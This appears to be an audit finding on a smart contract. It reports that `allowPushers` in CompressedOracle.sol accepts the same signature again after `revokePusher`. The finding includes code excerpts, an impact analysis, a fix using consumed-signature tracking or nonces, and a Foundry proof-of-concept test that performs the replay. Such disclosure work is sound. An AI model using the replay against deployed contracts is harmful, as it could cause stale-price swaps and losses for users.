Looking at `allowPushers` and `revokePusher` in `CompressedOracle.sol` for signature replay protection.

The grep confirms there is **no nonce mapping and no used-signature tracking** anywhere in the oracle contracts. The vulnerability is real. Here is the full analysis:

---

### Title
Signature Replay in `allowPushers` Allows Creator to Silently Re-Delegate a Revoked Pusher Within the Deadline Window â€” (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` verifies an EIP-191 signature over `(chainid, oracle, deadline, pusher, creator)` but never marks the signature as consumed and carries no nonce. After a pusher calls `revokePusher`, the creator can replay the identical signature â€” as long as `block.timestamp <= deadline` â€” to silently re-establish `namespaceRemapping[pusher] = creator`. The pusher's subsequent pushes are redirected to the creator's namespace without the pusher's knowledge, starving the pusher's own pools of fresh data.

---

### Finding Description

`allowPushers` constructs the signed digest as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

There is no nonce field and no `mapping(bytes32 => bool) usedSignatures` guard. The only liveness check is `block.timestamp <= deadline`. [2](#0-1) 

`revokePusher` zeroes the mapping entry:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

But `allowPushers` unconditionally overwrites it on the next call with the same signature:

```solidity
namespaceRemapping[pusher] = msg.sender;
``` [4](#0-3) 

The `fallback` push path reads `namespaceRemapping[msg.sender]` to decide which namespace to write into:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

So after the replay, every push from the pusher lands in the creator's storage slots, not the pusher's own namespace.

---

### Impact Explanation

- **Pusher's own pools** consume `feedIdOf(pusher, slotIndex, positionIndex)`. After the silent re-delegation, the pusher's pushes write into the creator's namespace instead. The pusher's own slots are never updated, so any pool reading `feedIdOf(pusher, ...)` receives stale price data (timestamp 0 or the last pre-revocation value).
- Stale data reaching a pool's price read constitutes **bad-price execution**: the `AnchoredPriceProvider` / pool swap path will either revert on the staleness check (broken core functionality / unusable swap flow) or, if the drift window is wide enough, execute swaps at an outdated price (direct loss of user principal).
- The creator can sustain the re-delegation for the entire deadline window (up to the pusher-chosen `deadline`) with zero additional cost, making this a persistent, not one-shot, attack.

---

### Likelihood Explanation

- The pusher must have previously signed a delegation with a future deadline (standard operational practice).
- The creator retains the original calldata/signature from the first `allowPushers` call (trivially available from on-chain history).
- No privileged role is required beyond being the feed creator (a permissionless identity derived from the `feedId`).
- The pusher has no on-chain way to invalidate the signature before the deadline expires; calling `revokePusher` is immediately undone by the creator's replay.

---

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedDelegations` and revert if the digest has already been used:

```solidity
mapping(bytes32 => bool) private _usedDelegations;

// inside allowPushers, after recovering the signer:
require(!_usedDelegations[hash], SignatureAlreadyUsed());
_usedDelegations[hash] = true;
```

Alternatively, add a per-pusher nonce (`mapping(address => uint256) public pusherNonce`) that the pusher increments to invalidate all prior signatures on demand.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract ReplayTest is Test {
    CompressedOracleV1 oracle;
    uint256 pusherKey = 0xBEEF;
    address pusher;
    address creator;

    function setUp() public {
        pusher  = vm.addr(pusherKey);
        creator = makeAddr("creator");
        oracle  = new CompressedOracleV1(address(this), 60_000);
    }

    function test_replayAfterRevoke() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent for creator
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19Ethereum Signed Message:\n32",
                keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pusherKey, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        bytes[]   memory sigs    = new bytes[](1);
        pushers[0] = pusher;
        sigs[0]    = sig;

        // 2. Creator delegates
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // 4. Creator replays the SAME signature â€” no revert
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);

        // 5. Pusher is silently re-delegated
        assertEq(oracle.namespaceRemapping(pusher), creator);
    }
}
```
